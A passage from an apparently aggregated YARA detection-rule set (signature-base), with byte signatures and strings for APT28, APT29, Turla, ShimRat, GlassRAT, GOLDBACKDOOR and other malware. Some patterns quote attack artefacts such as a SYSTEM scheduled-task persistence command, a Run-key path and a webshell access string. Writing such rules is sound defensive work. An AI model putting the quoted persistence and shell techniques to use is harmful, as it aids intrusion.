		$key31 = { FDB726261CADD52E10818B49CAB81BEF112CB63832DAA26AD9FC711EA6CE99A4 }
		$key32 = { 86C0CAA26D9FD07D215BC7EB14E2DA250E905D406AFFAB44FB1C62A2EAFC4670 }
		$key33 = { BC101329B0E3A7D13F6EBC535097785E27D59E92D449D6D06538725034B8C0F0 }
		$key34 = { C8D31A78B7C149F62F06497F9DC1DDC4967B566AC52C3A2A65AC7A99643B8A2D }
		$key35 = { 0EA4A5C565EFBB94F5041392C5F0565B6BADC630D9005B3EADD5D81110623E1F }
		$key36 = { 06E4E46BD3A0FFC8A4125A6A02B0C56D5D8B9E378CF97539CE4D4ADFAF89FEB5 }
		$key37 = { 6DE22040821F0827316291331256A170E23FA76E381CA7066AF1E5197AE3CFE7 }
		$key38 = { C6EF27480F2F6F40910074A45715143954BBA78CD74E92413F785BBA5B2AA121 }
		$key39 = { 19C96A28F8D9698ADADD2E31F2426A46FD11D2D45F64169EDC7158389BFA59B4 }
		$key40 = { C3C3DDBB9D4645772373A815B5125BB2232D8782919D206E0E79A6A973FF5D36 }
		$key41 = { C33AF1608037D7A3AA7FB860911312B4409936D236564044CFE6ED42E54B78A8 }
		$key42 = { 856A0806A1DFA94B5E62ABEF75BEA3B657D9888E30C8D2FFAEC042930BBA3C90 }
		$key43 = { 244496C524401182A2BC72177A15CDD2EF55601F1D321ECBF2605FFD1B9B8E3F }
		$key44 = { DF24050364168606D2F81E4D0DEB1FFC417F1B5EB13A2AA49A89A1B5242FF503 }
		$key45 = { 54FA07B8108DBFE285DD2F92C84E8F09CDAA687FE492237F1BC4343FF4294248 }
		$key46 = { 23490033D6BF165B9C45EE65947D6E6127D6E00C68038B83C8BFC2BCE905040C }
		$key47 = { 4E044025C45680609B6EC52FEB3491130A711F7375AAF63D69B9F952BEFD5F0C }
		$key48 = { 019F31C5F5B2269020EBC00C1F511F2AC23E9D37E89374514C6DA40A6A03176C }
		$key49 = { A2483197FA57271B43E7276238468CFB8429326CBDA7BD091461147F642BEB06 }
		$key50 = { 731C9D6E74C589B7ACB019E5F6A6E07ACF12E68CB9A396CE05AA4D69D5387048 }
		$key51 = { 540DB6C8D23F7F7FEF9964E53F445F0E56459B10E931DEEEDB2B57B063C7F8B7 }
		$key52 = { D5AF80A7EEFF26DE988AC3D7CE23E62568813551B2133F8D3E973DA15E355833 }
		$key53 = { E4D8DBD3D801B1708C74485A972E7F00AFB45161C791EE05282BA68660FFBA45 }
		$key54 = { D79518AF96C920223D687DD596FCD545B126A678B7947EDFBF24661F232064FB }
		$key55 = { B57CAA4B45CA6E8332EB58C8E72D0D9853B3110B478FEA06B35026D7708AD225 }
		$key56 = { 077C714C47DFCF79CA2742B1544F4AA8035BB34AEA9D519DEE77745E01468408 }
		$key57 = { C3F5550AD424839E4CC54FA015994818F4FB62DE99B37C872AF0E52C376934FA }
		$key58 = { 5E890432AE87D0FA4D209A62B9E37AAEDEDC8C779008FEBAF9E4E6304D1B2AAC }
		$key59 = { A42EDE52B5AF4C02CFE76488CADE36A8BBC3204BCB1E05C402ECF450071EFCAB }
		$key60 = { 4CDAFE02894A04583169E1FB4717A402DAC44DA6E2536AE53F5F35467D31F1CA }
		$key61 = { 0BEFCC953AD0ED6B39CE6781E60B83C0CFD166B124D1966330CBA9ADFC9A7708 }
		$key62 = { 8A439DC4148A2F4D5996CE3FA152FF702366224737B8AA6784531480ED8C8877 }
		$key63 = { CF253BE3B06B310901FF48A351471374AD35BBE4EE654B72B860F2A6EC7B1DBB }
		$key64 = { A0599F50C4D059C5CFA16821E97C9596B1517B9FB6C6116F260415127F32CE1F }
		$key65 = { 8B6D704F3DC9150C6B7D2D54F9C3EAAB14654ACA2C5C3952604E65DF8133FE0C }
		$key66 = { A06E5CDD3871E9A3EE17F7E8DAE193EE47DDB87339F2C599402A78C15D77CEFD }
		$key67 = { E52ADA1D9BC4C089DBB771B59904A3E0E25B531B4D18B58E432D4FA0A41D9E8A }
		$key68 = { 4778A7E23C686C171FDDCCB8E26F98C4CBEBDF180494A647C2F6E7661385F05B }
		$key69 = { FE983D3A00A9521F871ED8698E702D595C0C7160A118A7630E8EC92114BA7C12 }
		$key70 = { 52BA4C52639E71EABD49534BBA80A4168D15762E2D1D913BAB5A5DBF14D9D166 }
		$key71 = { 931EB8F7BC2AE1797335C42DB56843427EB970ABD601E7825C4441701D13D7B1 }
		$key72 = { 318FA8EDB989672DBE2B5A74949EB6125727BD2E28A4B084E8F1F50604CCB735 }
		$key73 = { 5B5F2315E88A42A7B59C1B493AD15B92F819C021BD70A5A6619AAC6666639BC2 }
		$key74 = { C2BED7AA481951FEB56C47F03EA38236BC425779B2FD1F1397CB79FE2E15C0F0 }
		$key75 = { D3979B1CB0EC1A655961559704D7CDC019253ACB2259DFB92558B7536D774441 }
		$key76 = { 0EDF5DBECB772424D879BBDD51899D6AAED736D0311589566D41A9DBB8ED1CC7 }
		$key77 = { CC798598F0A9BCC82378A5740143DEAF1A147F4B2908A197494B7202388EC905 }
		$key78 = { 074E9DF7F859BF1BD1658FD2A86D81C282000EAB09AF4252FAB45433421D3849 }
		$key79 = { 6CD540642E007F00650ED20D7B54CFFD54DDA95D8DEBB087A004BAE222F22C8E }
		$key80 = { C76CF2F66C71F6D17FC8DEFA1CAEF8718BA1CE188C7EA02C835A0FA54D3B3314 }
		$key81 = { A7250A149600E515C9C40FE5720756FDA8251635A3B661261070CB5DABFE7253 }
		$key82 = { 237C67B97D4CCE4610DE2B82E582808EA796C34A4C24715C953CBA403B2C935E }
		$key83 = { A8FA182547E66B57C497DAAA195A38C0F0FB0A3C1F7B98B4B852F5F37E885127 }
		$key84 = { 83694CCA50B821144FFBBE6855F62845F1328111AE1AC5666CBA59EB43AA12C6 }
		$key85 = { 145E906416B17865AD37CD022DF5481F28C930D6E3F53C50B0953BF33F4DB953 }
		$key86 = { AB49B7C2FA3027A767F5AA94EAF2B312BBE3E89FD924EF89B92A7CF977354C22 }
		$key87 = { 7E04E478340C209B01CA2FEBBCE3FE77C6E6169F0B0528C42FA4BDA6D90AC957 }
		$key88 = { 0EADD042B9F0DDBABA0CA676EFA4EDB68A045595097E5A392217DFFC21A8532F }
		$key89 = { 5623710F134ECACD5B70434A1431009E3556343ED48E77F6A557F2C7FF46F655 }
		$key90 = { 6968657DB62F4A119F8E5CB3BF5C51F4B285328613AA7DB9016F8000B576561F }
		$key91 = { DEBB9C95EAE6A68974023C335F8D2711135A98260415DF05845F053AD65B59B4 }
		$key92 = { 16F54900DBF08950F2C5835153AB636605FB8C09106C0E94CB13CEA16F275685 }
		$key93 = { 1C9F86F88F0F4882D5CBD32876368E7B311A84418692D652A6A4F315CC499AE8 }
		$key94 = { E920E0783028FA05F4CE2D6A04BBE636D56A775CFD4DAEA3F2A1B8BEEB52A6D4 }
		$key95 = { 73874CA3AF47A8A315D50E1990F44F655EC7C15B146FFE0611B6C4FC096BD07C }
		$key96 = { F21C1FA163C745789C53922C47E191A5A85301BDC2FFC3D3B688CFBFF39F3BE5 }
		$key97 = { BC5A861F21CB98BD1E2AE9650B7A0BB4CD0C71900B3463C1BC3380AFD2BB948E }
		$key98 = { 151BAE36E646F30570DC6A7B57752F2481A0B48DD5184E914BCF411D8AD5ACA0 }
		$key99 = { F05AD6D7A0CADC10A6468BFDBCBB223D5BD6CA30EE19C239E8035772D80312C9 }
		$key100 = { 5DE9A0FDB37C0D59C298577E5379BCAF4F86DF3E9FA17787A4CEFA7DD10C462E }
		$key101 = { F5E62BA862380224D159A324D25FD321E5B35F8554D70CF9A506767713BCA508 }
		$key102 = { A2D1B10409B328DA0CCBFFDE2AD2FF10855F95DA36A1D3DBA84952BB05F8C3A7 }
		$key103 = { C974ABD227D3AD339FAC11C97E11D904706EDEA610B181B8FAD473FFCC36A695 }
		$key104 = { AB5167D2241406C3C0178D3F28664398D5213EE5D2C09DCC9410CB604671F5F1 }
		$key105 = { C25CC4E671CAAA31E137700A9DB3A272D4E157A6A1F47235043D954BAE8A3C70 }
		$key106 = { E6005757CA0189AC38F9B6D5AD584881399F28DA949A0F98D8A4E3862E20F715 }
		$key107 = { 204E6CEB4FF59787EF4D5C9CA5A41DDF4445B9D8E0C970B86D543E9C7435B194 }
		$key108 = { 831D7FD21316590263B69E095ABBE89E01A176E16AE799D83BD774AF0D254390 }
		$key109 = { 42C36355D9BC573D72F546CDB12E6BB2CFE2933AC92C12040386B310ABF6A1ED }
		$key110 = { B9044393C09AD03390160041446BF3134D864D16B25F1AB5E5CDC690C4677E7D }
		$key111 = { 6BC1102B5BE05EEBF65E2C3ACA1F4E17A59B2E57FB480DE016D371DA3AEF57A5 }
		$key112 = { B068D00B482FF73F8D23795743C76FE8639D405EE54D3EFB20AFD55A9E2DFF4E }
		$key113 = { 95CF5ADDFE511C8C7496E3B75D52A0C0EFE01ED52D5DD04D0CA6A7ABD3A6F968 }
		$key114 = { 75534574A4620019F8E3D055367016255034FA7D91CBCA9E717149441742AC8D }
		$key115 = { 96F1013A5301534BE424A11A94B740E5EB3A627D052D1B769E64BAB6A666433C }
		$key116 = { 584477AB45CAF729EE9844834F84683ABECAB7C4F7D23A9636F54CDD5B8F19B3 }
		$key117 = { D3905F185B564149EE85CC3D093477C8FF2F8CF601C68C38BBD81517672ECA3A }
		$key118 = { BF29521A7F94636D1930AA236422EB6351775A523DE68AF9BF9F1026CEDA618D }
		$key119 = { 04B3A783470AF1613A9B849FBD6F020EE65C612343EB1C028B2C28590789E60B }
		$key120 = { 3D8D8E84977FE5D21B6971D8D873E7BED048E21333FE15BE2B3D1732C7FD3D04 }
		$key121 = { 8ACB88224B6EF466D7653EB0D8256EA86D50BBA14FD05F7A0E77ACD574E9D9FF }
		$key122 = { B46121FFCF1565A77AA45752C9C5FB3716B6D8658737DF95AE8B6A2374432228 }
		$key123 = { A4432874588D1BD2317224FB371F324DD60AB25D4191F2F01C5C13909F35B943 }
		$key124 = { 78E1B7D06ED2A2A044C69B7CE6CDC9BCD77C19180D0B082A671BBA06507349C8 }
		$key125 = { 540198C3D33A631801FE94E7CB5DA3A2D9BCBAE7C7C3112EDECB342F3F7DF793 }
		$key126 = { 7E905652CAB96ACBB7FEB2825B55243511DF1CD8A22D0680F83AAF37B8A7CB36 }
		$key127 = { 37218801DBF2CD92F07F154CD53981E6189DBFBACAC53BC200EAFAB891C5EEC8 }

	condition:
		any of them
}

rule SIGNATURE_BASE_IMPLANT_5_V3
{
	meta:
		description = "XTunnel Implant by APT28"
		author = "US CERT"
		id = "0763e314-85d0-5c16-b766-36298176e0ff"
		date = "2017-02-10"
		modified = "2023-12-05"
		reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_grizzlybear_uscert.yar#L1194-L1207"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "aec1314858732d30b62a033e85eea50b3375e4f5b0e1818a941979d5be672297"
		score = 85
		quality = 85
		tags = ""

	strings:
		$BYTES1 = { 0F AF C0 6? C0 07 00 00 00 2D 01 00 00 00 0F AF ?? 39 ?8 }
		$BYTES2 = { 0F AF C0 6? C0 07 48 0F AF ?? 39 ?8 }

	condition:
		any of them
}

rule SIGNATURE_BASE_IMPLANT_5_V4
{
	meta:
		description = "XTunnel Implant by APT28"
		author = "US CERT"
		id = "db6df7ea-f119-5e9a-bcea-c65580418042"
		date = "2017-02-10"
		modified = "2023-12-05"
		reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_grizzlybear_uscert.yar#L1209-L1225"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "98a08860453496d9629f62c64fed50a24b8378dcfa39b8b654610c2ac9084fa8"
		score = 85
		quality = 85
		tags = ""

	strings:
		$FBKEY1 = { 987AB999FE0924A2DF0A412B14E26093746FCDF9BA31DC05536892C33B116AD3 }
		$FBKEY2 = { 8B236C892D902B0C9A6D37AE4F9842C3070FBDC14099C6930158563C6AC00FF5 }
		$FBKEY3 = { E47B7F110CAA1DA617545567EC972AF3A6E7B4E6807B7981D3CFBD3D8FCC3373 }
		$FBKEY4 = { 48B284545CA1FA74F64FDBE2E605D68CED8A726D05EBEFD9BAAC164A7949BDC1 }
		$FBKEY5 = { FB421558E30FCCD95FA7BC45AC92D2991C44072230F6FBEAA211341B5BF2DC56 }

	condition:
		all of them
}

rule SIGNATURE_BASE_Unidentified_Malware_Two
{
	meta:
		description = "Unidentified Implant by APT29"
		author = "US CERT"
		id = "848f2d1f-e352-51c1-ac5d-841bf309f2f2"
		date = "2017-02-10"
		modified = "2023-12-05"
		reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_grizzlybear_uscert.yar#L1520-L1542"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "cd9adfb9e27e4d6b27498cc029e15132343f036cca60210528720a533fe20d9a"
		score = 85
		quality = 85
		tags = ""

	strings:
		$my_string_one = "/zapoy/gate.php"
		$my_string_two = { E3 40 FE 45 FD 0F B6 45 FD 0F B6 14 38 88 55 FF 00 55
         FC 0F B6 45 FC 8A 14 38 88 55 FE 0F B6 45 FD 88 14 38 0F B6 45 FC 8A
         55 FF 88 14 38 8A 55 FF 02 55 FE 8A 14 3A 8B 45 F8 30 14 30 }
		$my_string_three = "S:\\Lidstone\\renewing\\HA\\disable\\In.pdb"
		$my_string_four = { 8B CF 0F AF CE 8B C6 99 2B C2 8B 55 08 D1 F8 03 C8
         8B 45 FC 03 C2 89 45 10 8A 00 2B CB 32 C1 85 DB 74 07 }
		$my_string_five = "fuckyou1"
		$my_string_six = "xtool.exe"

	condition:
		($my_string_one and $my_string_two ) or ( $my_string_three or $my_string_four ) or ( $my_string_five and $my_string_six )
}

rule SIGNATURE_BASE_Shimrat
{
	meta:
		description = "Detects ShimRat and the ShimRat loader"
		author = "Yonathan Klijnsma (yonathan.klijnsma@fox-it.com)"
		id = "21431895-1180-5552-8e82-1589992ffa1d"
		date = "2015-11-20"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_mofang.yar#L1-L26"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "0dd19e6a65b06bd5846ec224f01c3feea066540317223d1991154b2305882b20"
		score = 75
		quality = 85
		tags = ""

	strings:
		$dll = ".dll"
		$dat = ".dat"
		$headersig = "QWERTYUIOPLKJHG"
		$datasig = "MNBVCXZLKJHGFDS"
		$datamarker1 = "Data$$00"
		$datamarker2 = "Data$$01%c%sData"
		$cmdlineformat = "ping localhost -n 9 /c %s > nul"
		$demoproject_keyword1 = "Demo"
		$demoproject_keyword2 = "Win32App"
		$comspec = "COMSPEC"
		$shim_func1 = "ShimMain"
		$shim_func2 = "NotifyShims"
		$shim_func3 = "GetHookAPIs"

	condition:
		($dll and $dat and $headersig and $datasig ) or ( $datamarker1 and $datamarker2 ) or ( $cmdlineformat and $demoproject_keyword1 and $demoproject_keyword2 and $comspec ) or ( $dll and $dat and $shim_func1 and $shim_func2 and $shim_func3 )
}

rule SIGNATURE_BASE_Shimratreporter
{
	meta:
		description = "Detects ShimRatReporter"
		author = "Yonathan Klijnsma (yonathan.klijnsma@fox-it.com)"
		id = "01688b3c-2f06-518f-939d-4d65529be5ae"
		date = "2015-11-20"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_mofang.yar#L28-L49"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "931d65628e5f0b7c63fe270b0a6cd3890f41a4ee7e253ce056b37f2d55542258"
		score = 75
		quality = 85
		tags = ""

	strings:
		$IpInfo = "IP-INFO"
		$NetworkInfo = "Network-INFO"
		$OsInfo = "OS-INFO"
		$ProcessInfo = "Process-INFO"
		$BrowserInfo = "Browser-INFO"
		$QueryUserInfo = "QueryUser-INFO"
		$UsersInfo = "Users-INFO"
		$SoftwareInfo = "Software-INFO"
		$AddressFormat = "%02X-%02X-%02X-%02X-%02X-%02X"
		$proxy_str = "(from environment) = %s"
		$netuserfun = "NetUserEnum"
		$networkparams = "GetNetworkParams"

	condition:
		all of them
}

rule SIGNATURE_BASE_Glassrat
{
	meta:
		description = "Detects GlassRAT by RSA (modified by Florian Roth - speed improvements)"
		author = "RSA RESEARCH"
		id = "7739d1f6-f16d-5599-9388-a1d89dbeb355"
		date = "2015-11-03"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_glassRAT.yar#L8-L43"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "939d2cb11ff414641f68b2913fe8d24458e1fd7ba450b8781072bb10da3ad039"
		score = 75
		quality = 85
		tags = ""
		Info = "GlassRat"

	strings:
		$bin1 = {85 C0 B3 01}
		$bin3 = {68 4C 50 00 10}
		$bin4 = {68 48 50 00 10}
		$bin5 = {68 44 50 00 10}
		$hs = {CB FF 5D C9 AD 3F 5B A1 54 13 FE FB 05 C6 22}
		$s1 = "pwlfnn10,gzg"
		$s2 = "AddNum"
		$s3 = "ServiceMain"
		$s4 = "The Window"
		$s5 = "off.dat"

	condition:
		all of ( $bin* ) and $hs and 3 of ( $s* )
}

rule SIGNATURE_BASE_HKTL_Powersploit
{
	meta:
		description = "Detects default strings used by PowerSploit to establish persistence"
		author = "Markus Neis"
		id = "8cb0753c-c5bb-56fc-b492-4e785f4bdaf4"
		date = "2018-06-23"
		modified = "2023-12-05"
		reference = "https://www.hybrid-analysis.com/sample/16937e76db6d88ed0420ee87317424af2d4e19117fe12d1364fee35aa2fadb75?environmentId=100"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_powersploit_dropper.yar#L1-L15"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "00bc389147926f3b474a7072381bb8b9cddad3ff581a5d2182006a674e0c0163"
		score = 75
		quality = 81
		tags = ""
		hash1 = "16937e76db6d88ed0420ee87317424af2d4e19117fe12d1364fee35aa2fadb75"

	strings:
		$ps = "function" nocase ascii wide
		$s1 = "/Create /RU system /SC ONLOGON" ascii wide
		$s2 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" ascii wide

	condition:
		all of them
}

rule SIGNATURE_BASE_LOG_APT_WEBSHELL_Solarwinds_SUNBURST_Report_Webshell_Dec20_2
{
	meta:
		description = "Detects webshell access mentioned in FireEye's SUNBURST report"
		author = "Florian Roth (Nextron Systems)"
		id = "fb86164d-13de-5357-8f52-c597b51127ff"
		date = "2020-12-21"
		modified = "2023-12-05"
		reference = "https://www.guidepointsecurity.com/supernova-solarwinds-net-webshell-analysis/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_solarwinds_susp_sunburst.yar#L21-L32"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "ec52e244a483ace0f6932b553b159b23b767c00d1f64a4711e5f359832e846f5"
		score = 75
		quality = 60
		tags = ""

	strings:
		$xr1 = /logoimagehandler.ashx[^\n\s]{1,400}clazz=/ ascii wide

	condition:
		$xr1
}

rule SIGNATURE_BASE_Waterbug_Wipbot_2013_Dll
{
	meta:
		description = "Symantec Waterbug Attack - Trojan.Wipbot 2014 Down.dll component"
		author = "Symantec Security Response"
		id = "2aae09a3-6e59-5951-941e-c1f82aada979"
		date = "2015-01-22"
		modified = "2023-12-05"
		reference = "http://t.co/rF35OaAXrl"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_waterbug.yar#L17-L32"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "f29ff81d62bd6bea776aeddc0725b034624f836c234441f63a8b697e959d3f8d"
		score = 75
		quality = 85
		tags = ""

	strings:
		$string1 = "/%s?rank=%s"
		$string2 = "ModuleStart\x00ModuleStop\x00start"
		$string3 = "1156fd22-3443-4344-c4ffff"
		$string4 = "read\x20file\x2E\x2E\x2E\x20error\x00\x00"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Waterbug_Turla_Dropper
{
	meta:
		description = "Symantec Waterbug Attack - Trojan Turla Dropper"
		author = "Symantec Security Response"
		id = "f9683ac7-36f3-5a2a-8b76-e8e2527f4e0d"
		date = "2015-01-22"
		modified = "2023-12-05"
		reference = "http://t.co/rF35OaAXrl"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_waterbug.yar#L50-L62"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "6836b8d28fb41d9459f24d22e3c428b022b26885b7dce1caa5b0d5a7a1b7f82b"
		score = 75
		quality = 85
		tags = ""

	strings:
		$a = {0F 31 14 31 20 31 3C 31 85 31 8C 31 A8 31 B1 31 D1 31 8B 32 91 32 B6 32 C4 32 6C 33 AC 33 10 34}
		$b = {48 41 4C 2E 64 6C 6C 00 6E 74 64 6C 6C 00 00 00 57 8B F9 8B 0D ?? ?? ?? ?? ?? C9 75 26 56 0F 20 C6 8B C6 25 FF FF FE FF 0F 22 C0 E8}

	condition:
		all of them
}

rule SIGNATURE_BASE_Irontiger_Wmiexec
{
	meta:
		description = "Iron Tiger Tool - wmi.vbs detection"
		author = "Cyber Safety Solutions, Trend Micro"
		id = "a3060f50-3594-5da9-98e2-6fa0087451f5"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "http://goo.gl/T5fSJC"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_irontiger_trendmicro.yar#L259-L276"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "7988b993345e13b64e5f02ecd2679fc484b063a4cd2f18b52d00d2dfa34d82cb"
		score = 75
		quality = 85
		tags = ""

	strings:
		$str1 = "Temp Result File , Change it to where you like" wide ascii
		$str2 = "wmiexec" wide ascii
		$str3 = "By. Twi1ight" wide ascii
		$str4 = "[both mode] ,delay TIME to read result" wide ascii
		$str5 = "such as nc.exe or Trojan" wide ascii
		$str6 = "+++shell mode+++" wide ascii
		$str7 = "win2008 fso has no privilege to delete file" wide ascii

	condition:
		2 of ( $str* )
}

rule SIGNATURE_BASE_EXT_NK_GOLDBACKDOOR_Inital_Shellcode
{
	meta:
		description = "Detection for initial shellcode loader used to deploy GOLDBACDOOR"
		author = "Silas Cutler (silas@Stairwell.com)"
		id = "daab8e54-11b3-51cc-8bee-55b078f3e791"
		date = "2022-04-21"
		modified = "2023-12-05"
		reference = "https://stairwell.com/wp-content/uploads/2022/04/Stairwell-threat-report-The-ink-stained-trail-of-GOLDBACKDOOR.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_nk_goldbackdoor.yar#L2-L20"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "4df97181037a580098dbe34d3b6ceab5c7b83932f1831c36ee99876a8f1524f9"
		score = 80
		quality = 85
		tags = ""
		version = "0.1"

	strings:
		$ = { C7 45 C4 25 6C 6F 63 50 8D 45 C4 C7 45 C8 61 6C 61 70 8B F9 C7 45
              CC 70 64 61 74 50 B9 BD 88 17 75 C7 45 D0 61 25 5C 6C 8B DA C7 45 D4 6F
              67 5F 67 C7 45 D8 6F 6C 64 2E C7 45 DC 74 78 74 00 }
		$ = { 51 50 57 56 B9 E6 8E 85 35 E8 ?? ?? ?? ?? FF D0 }
		$ = { 6A 40 68 00 10 00 00 52 6A 00 FF 75 E0 B9 E3 18 90 72 E8 ?? ?? ?? ?? FF D0}

	condition:
		all of them
}

rule SIGNATURE_BASE_EXT_NK_GOLDBACKDOOR_Injected_Shellcode
{
	meta:
		description = "Detection for injected shellcode that decodes GOLDBACKDOOR"
		author = "Silas Cutler (silas@Stairwell.com)"
		id = "aa921f01-98cc-51ab-877a-e7beede77e36"
		date = "2022-04-21"
		modified = "2023-12-05"
		reference = "https://stairwell.com/wp-content/uploads/2022/04/Stairwell-threat-report-The-ink-stained-trail-of-GOLDBACKDOOR.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_nk_goldbackdoor.yar#L22-L42"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "b45f408c0f342591e66ef0dfcfc1c09f8558c5e8f4bd7f824b30f00d531c7511"
		score = 80
		quality = 85
		tags = ""
		version = "0.1"

	strings:
		$dec_routine = { 8A 19 57 8B FA 8B 51 01 83 C1 05 85 D2 74 0E 56 8B C1 8B F2 30 18 40 83 EE 01 75 F8 5E 57 }
		$rtlfillmemory_load = { B9 4B 17 CD 5B 55 56 33 ED 55 6A 10 50 E8 86 00 00 00 FF D0 }
		$ = "StartModule"
		$log_file_name = { C7 44 24 3C 25 6C 6F 63 50 8D 44 24 40 C7 44 24 44 61 6C 
                           61 70 50 B9 BD 88 17 75 C7 44 24 4C 70 64 61 74 C7 44 24 
                           50 61 25 5C 6C C7 44 24 54 6F 67 5F 67 C7 44 24 58 6F 6C
                           64 32 C7 44 24 5C 2E 74 78 74 }
		$ = { B9 8E 8A DD 8D 8B F0 E8 E9 FB FF FF FF D0 }

	condition:
		3 of them
}

rule SIGNATURE_BASE_EXT_NK_GOLDBACKDOOR_Generic_Shellcode
{
	meta:
		description = "Generic detection for shellcode used to drop GOLDBACKDOOR"
		author = "Silas Cutler (silas@Stairwell.com)"
		id = "70081d63-0b26-5358-8444-5adc3a44aaa0"
		date = "2022-04-21"
		modified = "2023-12-05"
		reference = "https://stairwell.com/wp-content/uploads/2022/04/Stairwell-threat-report-The-ink-stained-trail-of-GOLDBACKDOOR.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_nk_goldbackdoor.yar#L44-L58"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "e046a70b1dee020ba73d960a9d91daaccd0b5c262965c8647f608c5c83a28257"
		score = 75
		quality = 85
		tags = ""
		version = "0.1"

	strings:
		$ = { B9 8E 8A DD 8D 8B F0 E8 ?? ?? ?? ?? FF D0 }
		$ = { B9 8E AB 6F 40 [1-10] 50 [1-10] E8 ?? ?? ?? ?? FF D0 }

	condition:
		all of them
}

rule SIGNATURE_BASE_Tofu_Backdoor
{
	meta:
		description = "Detects Tofu Trojan"
		author = "Cylance"
		id = "03848366-f139-5352-959d-390992d96296"
		date = "2017-02-28"
		modified = "2023-12-05"
		reference = "https://www.cylance.com/en_us/blog/the-deception-project-a-new-japanese-centric-threat.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_ham_tofu_chches.yar#L11-L24"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "67c49456dbe4dc4c8bc54139ce6d493ea5588392d8c64010d029d7a63ac7f976"
		score = 75
		quality = 85
		tags = ""

	strings:
		$a = "Cookies: Sym1.0"
		$b = "\\\\.\\pipe\\1[12345678]"
		$c = {66 0F FC C1 0F 11 40 D0 0F 10 40 D0 66 0F EF C2 0F 11 40 D0 0F 10 40 E0}

	condition:
		$a or $b or $c
}

rule SIGNATURE_BASE_RAT_AAR
{
	meta:
		description = "Detects AAR RAT"
		author = "Kevin Breen <kevin@techanarchy.net>"
		id = "42c1af80-cff3-505f-a3cb-35b7e34575e1"
		date = "2014-01-04"
		modified = "2023-12-05"
		reference = "http://malwareconfig.com/stats/AAR"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_rats_malwareconfig.yar#L1-L22"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "a206b3f5cf6cc870135bc267b5baab8333422dc917efce6c66ee907690592d09"
		score = 75
		quality = 85
		tags = ""
		maltype = "Remote Access Trojan"
